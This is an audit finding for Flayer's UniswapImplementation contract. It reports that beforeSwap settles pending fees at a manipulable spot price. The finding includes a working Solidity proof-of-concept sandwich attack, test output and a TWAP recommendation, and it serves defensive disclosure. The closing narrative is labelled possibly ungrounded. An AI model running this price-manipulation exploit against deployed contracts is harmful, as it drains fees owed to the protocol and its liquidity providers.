---
id: 23218
severity: "High"
---

# UniswapImplementation.before

## Description

In UniswapImplementation.beforeSwap(), when there is undistributed fee of collectionToken and users try to swap WETH->collectionToken, these pending fee of collectionToken will be firstly swapped. The issue is that the swap here is based on currentprice rather than a TWAP, this will make price manipulation attack available.
The issue arises on UniswapImplementation.sol:508 (link), current market price is fetched, and used for calculating swap token amount on L521 and L536. Per UniswapV4's delta accounting system, the market price can be easily manipulated even without flashloan.
Therefore, attackers can do the following steps in one execution to drain risk free profit from UniswapImplementation: (1) Sell some collectionTokens to decrease price (2) Swap with pool fee of collectionToken at a discount price (3) Buy exact collectionTokens of step1 to increase price back
File: src\contracts\implementation\UniswapImplementation.sol
```solidity
function beforeSwap(address sender, PoolKey calldata key,
IPoolManager.SwapParams memory params, bytes calldata hookData) public override
onlyByPoolManager returns (bytes4 selector_, BeforeSwapDelta beforeSwapDelta_,
uint24 swapFee_) {
    ...
    if (trigger && pendingPoolFees.amount1 != 0) {
        ...
        (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolId); //
        ...
        if (params.amountSpecified >= 0) {
            (, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
                sqrtPriceCurrentX96: sqrtPriceX96,
                ...
            });
        }
        else {
            (, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
                sqrtPriceCurrentX96: sqrtPriceX96,
                ...
            });
        }
        ...
    }
}
```
Internal pre-conditions
The UniswapImplementation has collected some fee of collectionToken
External pre-conditions
N/A
Attack Path
(1) Sell some collectionTokens to decrease price (2) Swap with pool fee of collectionToken at a discount price (3) Buy exact collectionTokens of step1 to increase price back
Attackers can drain risk free profit from the protocol.

## Proof of Concept

The following PoC shows a case that: (1) In the normal case, Alice swap 1ether collectionToken at a cost of 1.11ether of WETH (2) In the attack case, Alice swap 1ether collectionToken at only cost of 0.41ether of WETH
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import {Ownable} from '@solady/auth/Ownable.sol';
import {PoolSwapTest} from '@uniswap/v4-core/src/test/PoolSwapTest.sol';
import {Hooks, IHooks} from '@uniswap/v4-core/src/libraries/Hooks.sol';
import {IUnlockCallback} from '@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol';
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {CurrencySettler} from "@uniswap/v4-core/test/utils/CurrencySettler.sol";
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';
import {CollectionToken} from '@flayer/CollectionToken.sol';
import {Locker, ILocker} from '@flayer/Locker.sol';
import {LockerManager} from '@flayer/LockerManager.sol';
import {IBaseImplementation} from '@flayer-interfaces/IBaseImplementation.sol';
import {ICollectionToken} from '@flayer-interfaces/ICollectionToken.sol';
import {IListings} from '@flayer-interfaces/IListings.sol';
import {Currency, CurrencyLibrary} from '@uniswap/v4-core/src/types/Currency.sol';
import {LPFeeLibrary} from '@uniswap/v4-core/src/libraries/LPFeeLibrary.sol';
import {PoolKey} from '@uniswap/v4-core/src/types/PoolKey.sol';
import {PoolIdLibrary, PoolId} from '@uniswap/v4-core/src/types/PoolId.sol';
import {IPoolManager, PoolManager, Pool} from '@uniswap/v4-core/src/PoolManager.sol';
import {TickMath} from '@uniswap/v4-core/src/libraries/TickMath.sol';
import {Deployers} from '@uniswap/v4-core/test/utils/Deployers.sol';
import {FlayerTest} from './lib/FlayerTest.sol';
import {ERC721Mock} from './mocks/ERC721Mock.sol';
import {BaseImplementation, IBaseImplementation} from '@flayer/implementation/BaseImplementation.sol';
import {UniswapImplementation} from "@flayer/implementation/UniswapImplementation.sol";
import {console2} from 'forge-std/console2.sol';
contract AttackHelper is IUnlockCallback {
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;
    using CurrencySettler for Currency;
    IPoolManager public immutable manager;
    PoolKey public poolKey;
    struct CallbackData {
        address sender;
        IPoolManager.SwapParams params;
    }
    constructor(IPoolManager _manager, PoolKey memory _poolKey) {
        manager = _manager;
        poolKey = _poolKey;
    }
    function swap(
        IPoolManager.SwapParams memory params
    ) external {
        manager.unlock(abi.encode(CallbackData(msg.sender, params)));
    }
    function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
        CallbackData memory data = abi.decode(rawData, (CallbackData));
        // 1. Sell some collectionTokens to decrease price
        IPoolManager.SwapParams memory sellParam = IPoolManager.SwapParams({
            zeroForOne: false, // unflippedToken -> WETH
            amountSpecified: -10 ether, // exact input
            sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
        });
        manager.swap(poolKey, sellParam, "");
        // 2. Swap with pool fee at a discount price
        manager.swap(poolKey, data.params, "");
        // 3. Buy exact collectionTokens of step1 to increase price back
        IPoolManager.SwapParams memory buyParam = IPoolManager.SwapParams({
            zeroForOne: true, // WETH -> unflippedToken
            amountSpecified: 10 ether, // exact input
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        manager.swap(poolKey, buyParam, "");
        int256 delta0 = manager.currencyDelta(address(this), poolKey.currency0);
        int256 delta1 = manager.currencyDelta(address(this), poolKey.currency1);
        if (delta0 < 0) {
            poolKey.currency0.settle(manager, data.sender, uint256(-delta0), false);
        }
        if (delta1 < 0) {
            poolKey.currency1.settle(manager, data.sender, uint256(-delta1), false);
        }
        if (delta0 > 0) {
            poolKey.currency0.take(manager, data.sender, uint256(delta0), false);
        }
        if (delta1 > 0) {
            poolKey.currency1.take(manager, data.sender, uint256(delta1), false);
        }
        return abi.encode("");
    }
}
contract BeforeSwapPriceManupilationAttackTest is Deployers, FlayerTest {
    using LPFeeLibrary for uint24;
    using PoolIdLibrary for PoolKey;
    using StateLibrary for PoolManager;
    address internal constant BENEFICIARY = address(123);
    uint160 constant SQRT_PRICE_1 = 2**96; // 1 ETH per collectionToken
    ERC721Mock unflippedErc721;
    CollectionToken unflippedToken;
    PoolKey poolKey;
    AttackHelper attackHelper;
    constructor() {
        _deployPlatform();
    }
    function setUp() public {
        _createCollection();
        _initCollection();
        _addSomeFee();
        attackHelper = new AttackHelper(poolManager, poolKey);
    }
    function testNormalCase() public {
        address alice = users[0];
        _dealNativeToken(alice, 10 ether);
        _approveNativeToken(alice, address(poolSwap), type(uint).max);
        uint wethBefore = WETH.balanceOf(alice);
        assertEq(10 ether, wethBefore);
        uint unflippedTokenBefore = unflippedToken.balanceOf(alice);
        assertEq(0, unflippedTokenBefore);
        vm.startPrank(alice);
        poolSwap.swap(
            poolKey,
            IPoolManager.SwapParams({
                zeroForOne: true, // WETH -> unflippedToken
                amountSpecified: 1 ether, // exact output
                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
            }),
            PoolSwapTest.TestSettings({
                takeClaims: false,
                settleUsingBurn: false
            }),
            ''
        );
        vm.stopPrank();
        (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolKey.toId());
        // swap with fee, liquidity pool not been touched
        assertEq(SQRT_PRICE_1, sqrtPriceX96);
        // swap 1 ether collectionToken with 1.11 ether WETH
        uint wethAfter = WETH.balanceOf(alice);
        uint unflippedTokenAfter = unflippedToken.balanceOf(alice);
        uint wethCost = wethBefore - wethAfter;
        assertApproxEqAbs(1.11 ether, wethCost, 0.01 ether);
        uint unflippedTokenReceived = unflippedTokenAfter - unflippedTokenBefore;
        assertEq(1 ether, unflippedTokenReceived);
    }
    function testAttackCase() public {
        address alice = users[0];
        _dealNativeToken(alice, 10 ether);
        _approveNativeToken(alice, address(attackHelper), type(uint).max);
        uint wethBefore = WETH.balanceOf(alice);
        assertEq(10 ether, wethBefore);
        uint unflippedTokenBefore = unflippedToken.balanceOf(alice);
        assertEq(0, unflippedTokenBefore);
        vm.startPrank(alice);
        attackHelper.swap(
            IPoolManager.SwapParams({
                zeroForOne: true, // WETH -> unflippedToken
                amountSpecified: 1 ether, // exact output
                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
            })
        );
        vm.stopPrank();
        // swap 1 ether collectionToken with 0.41 ether WETH
        uint wethAfter = WETH.balanceOf(alice);
        uint unflippedTokenAfter = unflippedToken.balanceOf(alice);
        uint wethCost = wethBefore - wethAfter;
        assertApproxEqAbs(0.41 ether, wethCost, 0.01 ether);
        uint unflippedTokenReceived = unflippedTokenAfter - unflippedTokenBefore;
        assertEq(1 ether, unflippedTokenReceived);
    }
    function _createCollection() internal {
        while (address(unflippedToken) == address(0)) {
            unflippedErc721 = new ERC721Mock();
            address test = locker.createCollection(address(unflippedErc721),
            'Flipped', 'FLIP', 0);
            if (Currency.wrap(test) >= Currency.wrap(address(WETH))) {
                unflippedToken = CollectionToken(test);
            }
        }
        assertTrue(Currency.wrap(address(unflippedToken)) >=
        Currency.wrap(address(WETH)), 'Invalid unflipped token');
    }
    function _initCollection() internal {
        // This needs to avoid collision with other tests
        uint tokenOffset = uint(type(uint128).max) + 1;
        // Mint enough tokens to initialize successfully
        uint tokenIdsLength = locker.MINIMUM_TOKEN_IDS();
        uint[] memory _tokenIds = new uint[](tokenIdsLength);
        for (uint i; i < tokenIdsLength; ++i) {
            _tokenIds[i] = tokenOffset + i;
            unflippedErc721.mint(address(this), tokenOffset + i);
        }
        // Approve our {Locker} to transfer the tokens
        unflippedErc721.setApprovalForAll(address(locker), true);
        // Initialize the specified collection with the newly minted tokens. To
        allow for varied
        // denominations we go a little nuts with the ETH allocation.
        assertTrue(tokenIdsLength == 10);
        uint startBalance = WETH.balanceOf(address(this));
        _dealNativeToken(address(this), 10 ether);
        _approveNativeToken(address(this), address(locker), type(uint).max);
        locker.initializeCollection(address(unflippedErc721), 10 ether, _tokenIds,
        _tokenIds.length * 1 ether, SQRT_PRICE_1);
        _dealNativeToken(address(this), startBalance);
        // storing poolKey
        poolKey = PoolKey({
            currency0: Currency.wrap(address(WETH)),
            currency1: Currency.wrap(address(unflippedToken)),
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: 60,
            hooks: IHooks(address(uniswapImplementation))
        });
        (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolKey.toId());
        assertEq(SQRT_PRICE_1, sqrtPriceX96);
    }
    function _addSomeFee() internal {
        vm.prank(address(locker));
        unflippedToken.mint(address(this), 1 ether);
        unflippedToken.approve(address(uniswapImplementation), type(uint).max);
        uniswapImplementation.depositFees(address(unflippedErc721), 0, 1 ether);
        IBaseImplementation.ClaimableFees memory fees =
        uniswapImplementation.poolFees(address(unflippedErc721));
        assertEq(0, fees.amount0);
        assertEq(1 ether, fees.amount1);
    }
}
```
And the test log:
```
2024-08-flayer\flayer> forge test --match-contract BeforeSwapPriceManupilationAttackTest -vv
[✔] Compiling...
[✔] Compiling 1 files with Solc 0.8.26
[✔] Solc 0.8.26 finished in 15.82s
Compiler run successful!
Ran 2 tests for test/BugBeforeSwapPriceManupilationAttack.t.sol:BeforeSwapPriceManupilationAttackTest
[PASS] testAttackCase() (gas: 364330)
[PASS] testNormalCase() (gas: 283375)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.56ms (3.04ms CPU time)
Ran 1 test suite in 29.01ms (7.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

## Recommendation

Using TWAP, reference: https://blog.uniswap.org/uniswap-v4-truncated-oracle-hook.
Or swap collectionToken to WETH immediately at fee receiving time

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the beforeSwap hook of the UniswapImplementation contract. When the pool holds undistributed fees in the collection token and a user initiates a swap that triggers the hook, the contract swaps the pending fee using the current spot price of the token pair instead of a time‑weighted average price (TWAP). Because the spot price can be moved by ordinary trades, an attacker can manipulate the price in a single transaction sequence: first sell a quantity of the collection token to depress its price, then perform the fee‑swap at the artificially low price, and finally buy back the same amount of collection token to restore the original price. This three‑step flow yields a net profit for the attacker without any external capital outlay, effectively draining the protocol’s fee revenue. The impact is a loss of collected fees and a breach of the accounting assumptions that fees are exchanged at fair market value; liquidity providers and users see the protocol’s economics distorted. The condition for exploitation is the presence of pending pool fees in the collection token and the execution of a swap that triggers the beforeSwap logic. The issue was uncovered during a security audit by inspecting the beforeSwap implementation and confirming the exploit with a proof‑of‑concept test that showed a user paying only 0.41 ether of WETH for a token that normally costs 1.11 ether. The bug is subtle because the price after the attack returns to its original level, making the manipulation hard to detect from external observations. From a user’s perspective the UI would show a normal swap price but the fee taken by the protocol would be far lower than expected, effectively “money disappears” from the protocol’s balance while the attacker walks away with profit. This class of bug is an oracle manipulation vulnerability caused by using an instantaneous price feed for internal fee settlement. The recommended mitigation is to replace the spot price with a TWAP oracle when calculating the fee swap, or to immediately convert the fee into the base token (WETH) at the time of fee receipt, thereby removing the price‑sensitivity of the fee handling logic.
